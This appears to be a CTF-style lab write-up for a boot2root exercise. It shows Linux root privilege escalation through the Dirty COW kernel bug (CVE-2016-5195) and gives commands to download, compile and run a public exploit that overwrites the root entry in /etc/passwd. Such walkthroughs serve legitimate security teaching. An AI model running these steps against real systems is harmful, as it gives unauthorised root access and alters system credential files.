# Root privilege escalation - Method 2: Dirty cow (add /etc/passwd entry)

## LES: Linux privilege escalation auditing tool

LES tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It provides following functionality:

- Assessing kernel exposure on publicly known exploits
- Verifying state of kernel hardening security measures

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

```shell
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
bash les.sh > les.log
```

[Full Report here](/home/aurelien/dev/42_boot2root/logs/les.html)

We will use the exploit `dirtycow2` based on `CVE-2016-5195` vulnerability, commonly named `Dirty cow`.

```
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

## Dirty COW (Copy-On-Write)

### Details

[<img src="images/dirtycow.png" align="right" width="50%">](https://www.youtube.com/watch?v=kEsshExn7aE)

A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.

The bug has existed since around 2.6.22 (released in 2007) and was fixed on Oct 18, 2016.

Impact

- An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.
- This flaw allows an attacker with a local system account to modify on-disk binaries, bypassing the standard permission mechanisms that would prevent modification without an appropriate permission set.

### Exploit: Generates a new password hash on the fly and modifies /etc/passwd

| Link                                                                | Usage   | Description            | Family          |
| ------------------------------------------------------------------- | ------- | ---------------------- | --------------- |
| [dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c) | ./dirty | /etc/passwd based root | PTRACE_POKEDATA |

- This exploit uses the "pokemon" exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line.
- The user will be prompted for the new password when the binary is run.
- The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line.
- After running the exploit you should be able to login with the newly created user.

### How to

```shell
# Download and compile the exploit
curl https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c > dirty.c
gcc -pthread dirty.c -o dirty -lcrypt


# Run it and enter the new password
./dirty
  /etc/passwd successfully backed up to /tmp/passwd.bak
  Please enter the new password:

# Login with newly created user
su firefart
id
  uid=0(firefart) gid=0(root) groups=0(root)

# DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
mv /tmp/passwd.bak /etc/passwd
```

or run:

```shell
./scripts/exploits/dirtycow_add_passwd_entry.sh
```

## Sources

### Helpers

- [book.hacktricks.xyz - Linux Privilege Escalation](https://book.hacktricks.xyz/linux-unix/privilege-escalation)
- [Linux exploit suggester](https://github.com/mzet-/linux-exploit-suggester)

### Vulnerability

- [Dirty Cow - Vulnerability Details](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)

### Exploit

- [Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)
